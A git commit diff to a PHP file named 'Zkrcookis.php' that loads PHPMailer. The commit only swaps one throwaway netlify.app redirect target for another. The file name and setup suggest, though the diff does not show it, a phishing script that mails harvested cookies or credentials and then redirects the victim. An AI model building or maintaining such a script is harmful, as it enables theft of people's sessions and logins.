3ecdc344e6fa37d4287b1ec1816ecca16b18b0cc
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 23:21:55 +0500

    Update Zkrcookis.php

--- Zkrcookis.php
+++ Zkrcookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://sure-three-page-info.netlify.app/");
+header("Location: https://cory-team-copy-here.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
